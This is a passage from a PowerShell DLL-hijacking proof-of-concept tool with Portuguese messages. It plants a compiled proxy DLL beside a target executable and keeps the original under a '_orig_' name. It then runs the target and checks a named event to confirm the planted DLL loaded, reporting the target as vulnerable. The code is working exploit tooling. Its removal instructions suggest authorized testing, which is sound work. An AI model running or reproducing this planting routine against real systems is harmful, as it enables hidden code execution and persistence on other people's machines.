    Copy-Item $dllFile -Destination $cDllOut -Force
    try { [System.IO.File]::Copy($cOrigSrc, $cOrigDst, $true) } catch {}
    Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue

    # Valida: executa alvo e aguarda sinal do evento nomeado (sem spawnar processo)
    Write-Host "testando (10s)..." -NoNewline -ForegroundColor DarkCyan
    $vuln = Test-VulnDll $ExePath $evtName 10

    if ($vuln) {
        Write-Host " VULNERAVEL!" -ForegroundColor Green
        $results.Add([PSCustomObject]@{ Name=$cn; Status="VULNERAVEL" })
        $validatedDll = $candidate
        break
    } else {
        Write-Host " sem disparo." -ForegroundColor Yellow
        $results.Add([PSCustomObject]@{ Name=$cn; Status="SemDisparo" })
        Remove-Item $cDllOut  -Force -EA SilentlyContinue
        Remove-Item $cOrigDst -Force -EA SilentlyContinue
    }
}

# --- RESULTADO FINAL ──────────────────────────────────────────────────────────
Write-Host ""
Write-Section "RESULTADO DA VALIDACAO"
Write-Host ("  {0,-30} {1}" -f "DLL","Resultado") -ForegroundColor DarkCyan
Write-Host ("  {0,-30} {1}" -f ("─"*28),("─"*26)) -ForegroundColor DarkGray
foreach ($r in $results) {
    $color = switch ($r.Status) {
        "VULNERAVEL" { "Green"    }
        "SemDisparo" { "Yellow"   }
        default      { "DarkGray" }
    }
    $label = switch ($r.Status) {
        "VULNERAVEL" { "[OK] VULNERAVEL -- DLL carregada e evento sinalizado" }
        "SemDisparo" { "[--] evento nao sinalizado"           }
        "CompileErr" { "[??] falha de compilacao"              }
        "NoOriginal" { "[??] original nao encontrada"          }
    }
    Write-Host ("  {0,-30} {1}" -f $r.Name, $label) -ForegroundColor $color
}
Write-Host ""

if ($validatedDll) {
    $vn       = $validatedDll.Name
    $vb       = [System.IO.Path]::GetFileNameWithoutExtension($vn)
    $vDllOut  = Join-Path $ExeDir $vn
    $vOrigDst = Join-Path $ExeDir "_orig_$vb.dll"
    Write-Host "  ╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║  VULNERAVEL  --  PoC implantada e validada com sucesso!     ║" -ForegroundColor Green
    Write-Host "  ╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Ok "DLL explorada    : $vn  (risco $($validatedDll.Risk))"
    Write-Ok "Proxy implantada : $vDllOut"
    Write-Ok "Original copiada : $vOrigDst"
    Write-Host ""
    Write-Host "  Remova apos o teste:" -ForegroundColor DarkYellow
    Write-Host "    Remove-Item `"$vDllOut`"" -ForegroundColor White
    Write-Host "    Remove-Item `"$vOrigDst`"" -ForegroundColor White
} else {
    Write-Host "  ╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "  ║  NAO VULNERAVEL  --  Nenhum evento foi sinalizado.           ║" -ForegroundColor Red
    Write-Host "  ╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Warn "Possiveis causas: AV bloqueou o carregamento da DLL, processo encerrou antes do payload, ou a DLL nao e carregada neste caminho de busca."
}
